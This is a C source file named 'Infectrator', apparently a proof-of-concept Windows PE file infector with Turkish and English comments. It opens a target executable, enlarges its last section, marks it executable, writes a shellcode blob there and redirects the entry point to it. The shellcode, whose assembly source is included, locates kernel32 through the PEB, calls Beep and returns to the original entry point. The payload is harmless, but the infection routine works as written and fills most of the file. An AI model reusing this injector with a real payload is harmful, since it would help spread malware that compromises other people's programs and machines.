/*

2013 - Infectrator by Ibrahim Akgul 

*/
#include <stdio.h>
#include <Windows.h>

#define Align(Value,Alignment) (((Value+Alignment-1)/Alignment)*Alignment)

UCHAR Shellcode[] =
{
	0x55, 0x89, 0xE5, 0x83, 0xEC, 0x08, 0x53, 0x56, 0x57, 0xE8, 0x00, 0x00,
	0x00, 0x00, 0x5B, 0x81, 0xEB, 0x0E, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x30,
	0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x14, 0x8B, 0x00, 0x8B,
	0x00, 0x8B, 0x40, 0x10, 0x89, 0x45, 0xFC, 0x03, 0x40, 0x3C, 0x8B, 0x40,
	0x78, 0x03, 0x45, 0xFC, 0x89, 0x45, 0xF8, 0x31, 0xF6, 0x8B, 0x50, 0x20,
	0x03, 0x55, 0xFC, 0x56, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x8B, 0x34, 0xB2,
	0x03, 0x75, 0xFC, 0x8D, 0xBB, 0x8D, 0x00, 0x00, 0x00, 0xF3, 0xA6, 0x74,
	0x09, 0x5E, 0x46, 0x3B, 0x70, 0x14, 0x7C, 0xE3, 0xEB, 0x23, 0x5E, 0x8B,
	0x48, 0x1C, 0x03, 0x4D, 0xFC, 0x8B, 0x50, 0x24, 0x03, 0x55, 0xFC, 0x0F,
	0xB7, 0x04, 0x72, 0x8B, 0x04, 0x81, 0x03, 0x45, 0xFC, 0x68, 0xE8, 0x03,
	0x00, 0x00, 0x68, 0xE8, 0x03, 0x00, 0x00, 0xFF, 0xD0, 0xE8, 0x78, 0x56,
	0x34, 0x12, 0x5F, 0x5E, 0x5B, 0x89, 0xEC, 0x5D, 0xC3, 0x42, 0x65, 0x65,
	0x70
};

ULONG WINAPI FileAddressToVirtualAddress(PVOID ImageBase, ULONG FileAddress)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;

	ULONG i;

	pDosHeader = (PIMAGE_DOS_HEADER)ImageBase;
	pNTHeader = (PIMAGE_NT_HEADERS)((PUCHAR)ImageBase + pDosHeader->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)(pNTHeader + 1);

	for (i = 0; i<pNTHeader->FileHeader.NumberOfSections; i++)
	{
		if (FileAddress >= pSectionHeader[i].PointerToRawData && FileAddress<pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData)
		{
			return FileAddress - pSectionHeader[i].PointerToRawData + pSectionHeader[i].VirtualAddress;
		}
	}

	return 0;
}

int main(int argc, char** argv)
{
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;

	PIMAGE_SECTION_HEADER FirstSection, LastSection;

	ULONG i, NewFileSize, Offset, OriginalEntryPoint, NewEntryPoint, ExpandSize = sizeof(Shellcode);
	PVOID MappedFile, Buffer;

	HANDLE hFile, hMap;
	PUCHAR ptr;

/*	if (argc<2)
	{
		printf("\nUsage: Infectrator [Target file]\n");
		return 0;
	}
*/

	printf("\nDosyayi okuma/yazma haklari ile acmayi deniyoruz..\n");
	hFile = CreateFile(TEXT("D:\\source\\repos\\Infectrator\\Debug\\minimum.exe"), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); // Open the target file for read and write access

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Hata: Nasil dosya veriyosun arkadasim, acilmiyo bu :( (%u)\n", GetLastError());
		return 0;
	}

	// Dosyayi hafizaya almadan once win32'ye ilk bildirimi yapıyoruz ki bize oynacagimiz bir handle tahsis etsin
	printf("file mapping object olusturuluyor\n");
	// Hafiza da pis isler yapicaz, oynayacak alan lazim. Bu komut basarili calisir ise,
	// bu processimizin handle alaninda yeni bir section objemiz olusacak. 
	hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL); 

	if (!hMap)
	{
		printf("Hayatimda ilk defa file mapping object (%u) olusturamadim, yaziklar olsun boyle sisteme\n", GetLastError());
		CloseHandle(hFile);
		return 0;
	}

	printf("Dosyamizi hafizaya aliyoruz. Artik process memory alanimizda yeni bir mapping hafiza alanimiz olacak\n");
	MappedFile = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0); // Map the target file into memory

	if (!MappedFile)
	{
		printf("Hata: Yok artik mappleyemedik ya dosyayi hafizaya!!! napiyosun 256mb ram'li calistiriyosun bu sistemi? (%u)\n", GetLastError());

		CloseHandle(hMap);
		CloseHandle(hFile);

		return 0;
	}

	printf("Dosyayi %#x adresine mapledik hayirli olsun\n", MappedFile);

	// Dosya artik hafizada olduguna gore infection icin on denetimlere baslamanin da vakti geldi demektir. 
	// Oncelikle Pe validationlarini gerceklestirelim ki gidip bir jpeg dosyasına infecte olmaya calismasin kodumuz değil mi? :)

	// Hafiza da ki dosya byte dokumunu PIMAGE_DOS_HEADER yapısı ile ilişiklendiriyoruz yapisal erisimlerimizi pointerlar ile rahatlikla yapalim
	pDosHeader = (PIMAGE_DOS_HEADER)MappedFile;

	// Dosya MZ header'ina sahip mi. Unutma!! her exe,dll MZ ile başlar. inanmıyorsan hex editorle bak.
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Hata: Exe dedik birader, abidik gubidik dosyalar gonderme suraya!\n");
		UnmapViewOfFile(MappedFile);

		CloseHandle(hMap);
		CloseHandle(hFile);

		return 0;
	}

	// Anladik ki dosya executable, ama bu bilgi yeter mi bize? Tabiiki hayır. O zaman detaylara iniyoruz.. Önce 32 bit bir dosya olduğunu anliyalim.
	pNTHeader = (PIMAGE_NT_HEADERS)((PUCHAR)MappedFile + pDosHeader->e_lfanew);

	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("Hata: Dogru soyle native dos veya win3.1 makineden aldin bu exe yi di mi?\n");
		UnmapViewOfFile(MappedFile);

		CloseHandle(hMap);
		CloseHandle(hFile);

		return 0;
	}


	if (pNTHeader->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI && pNTHeader->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_CUI)
	{
		printf("Hata: Tamam bir exe olabilir ama asla bir PE değil!\n");
		UnmapViewOfFile(MappedFile);

		CloseHandle(hMap);
		CloseHandle(hFile);

		return 0;
	}

	if (pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL)
	{
		printf("Hata: Teknolojimiz henüz DLL injectionu desteklemiyor :(\n");
		UnmapViewOfFile(MappedFile);

		CloseHandle(hMap);
		CloseHandle(hFile);

		return 0;
	}

	OriginalEntryPoint = pNTHeader->OptionalHeader.AddressOfEntryPoint; // orjinal entrypoint'i sakliyalim lazım olacak
	printf("Mevcut entry point: %#x\n", OriginalEntryPoint);

	FirstSection = (PIMAGE_SECTION_HEADER)(pNTHeader + 1); // Get the first section
	LastSection = &FirstSection[pNTHeader->FileHeader.NumberOfSections - 1]; // Get the last section

	Offset = LastSection->PointerToRawData + LastSection->SizeOfRawData; // Offset to the new space in the expanded section
	printf("Offset to new space: %#x\n", Offset);

	LastSection->Misc.VirtualSize = Align(LastSection->Misc.VirtualSize + ExpandSize, pNTHeader->OptionalHeader.SectionAlignment); // Update the virtual size
	LastSection->SizeOfRawData = Align(LastSection->SizeOfRawData + ExpandSize, pNTHeader->OptionalHeader.FileAlignment); // Update the raw size
	LastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE; // Mark the section as executable

	NewFileSize = LastSection->PointerToRawData + LastSection->SizeOfRawData; // The new file size must be at least the sum of the file address and raw size, or the the PE image will fail to load
	NewEntryPoint = FileAddressToVirtualAddress(MappedFile, Offset);

	printf("New file size: %d bytes\nNew entry point: %#x\n", NewFileSize, NewEntryPoint);

	pNTHeader->OptionalHeader.AddressOfEntryPoint = NewEntryPoint; // Calculate the new entry point
	pNTHeader->OptionalHeader.SizeOfImage = Align(LastSection->VirtualAddress + LastSection->Misc.VirtualSize, pNTHeader->OptionalHeader.SectionAlignment); // Update the image size

	printf("Unmapping the target file\n");

	UnmapViewOfFile(MappedFile);
	CloseHandle(hMap);

	printf("Creating the file mapping object with new file size\n");
	hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, NewFileSize, NULL);

	if (!hMap)
	{
		printf("Unable to create the file mapping object (%u)\n", GetLastError());

		CloseHandle(hFile);
		return 0;
	}

	printf("Mapping the target file into memory\n");
	MappedFile = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

	if (!MappedFile)
	{
		printf("Error: Unable to map the target file into memory (%u)\n", GetLastError());

		CloseHandle(hMap);
		CloseHandle(hFile);

		return 0;
	}

	printf("File mapped at %#x\n", MappedFile);

	// Write the shellcode to the new space in the expanded section

	printf("Writing shellcode into target file\n");

	Buffer = (PUCHAR)MappedFile + Offset;
	memcpy(Buffer, Shellcode, sizeof(Shellcode));

	ptr = (PUCHAR)Buffer;

	// Find the dummy call in the shellcode and replace it with the real call to the original entry point

	for (i = 0; i<sizeof(Shellcode); i++)
	{
		if (ptr[i] == 0xe8 && *(PULONG)&ptr[i + 1] == 0x12345678)
		{
			// Call offset = Target address - Current address - 5

			*(PULONG)&ptr[i + 1] = OriginalEntryPoint - FileAddressToVirtualAddress(MappedFile, (ULONG)&ptr[i] - (ULONG)MappedFile) - 5;
		}
	}

	printf("Target file successfully infected!\n");
	UnmapViewOfFile(MappedFile);

	CloseHandle(hMap);
	CloseHandle(hFile);

	return 0;
}

/*

BITS 32

push ebp
mov ebp,esp
sub esp,8

; Local variables:
;
; [ebp-4] Address of kernel32.dll
; [ebp-8] Address of kernel32.dll's export directory

; Save registers

push ebx
push esi
push edi

call get_delta_offset ; Get the delta offset

get_delta_offset:
pop ebx
sub ebx,get_delta_offset

mov eax,[fs:0x30] ; Get the PEB address
mov eax,[eax+0xc]
mov eax,[eax+0x14]

; Get the address of kernel32.dll

mov eax,[eax]
mov eax,[eax]
mov eax,[eax+0x10]

mov [ebp-4],eax ; Save the address of kernel32.dll

add eax,[eax+0x3c] ; Get the address of PE header
mov eax,[eax+0x78] ; Get the address of export directory
add eax,[ebp-4]

mov [ebp-8],eax ; Save the address of export directory

; Parse the export table

xor esi,esi
mov edx,[eax+0x20]
add edx,[ebp-4]

loop:
push esi ; Save the index
mov ecx,len

mov esi,[edx+esi*4]

add esi,[ebp-4] ; esi now holds the address of the export name
lea edi,[str_Beep+ebx]

rep cmpsb ; Compare the string
je loop_end

pop esi ; Restore the index

inc esi
cmp esi,[eax+0x14]

jl loop
jmp exit ; Fail

loop_end:

pop esi ; esi now holds the index

mov ecx,[eax+0x1c]
add ecx,[ebp-4] ; ecx now holds the address of function addresses table

mov edx,[eax+0x24] ; edx now holds the address of ordinal table
add edx,[ebp-4]

movzx eax,word [edx+esi*2]

mov eax,[ecx+eax*4] ; eax now holds the RVA of the Beep function
add eax,[ebp-4] ; eax now holds the real address of the Beep function

push 1000
push 1000
call eax ; Call it

exit:

; Call the original entry point

call_opcode db 0xe8 ; opcode for call instruction
call_offset dd 0x12345678 ; Placeholder of the call offset

; Restore registers

pop edi
pop esi
pop ebx

mov esp,ebp
pop ebp

ret

str_Beep db "Beep"
len equ $-str_Beep

*/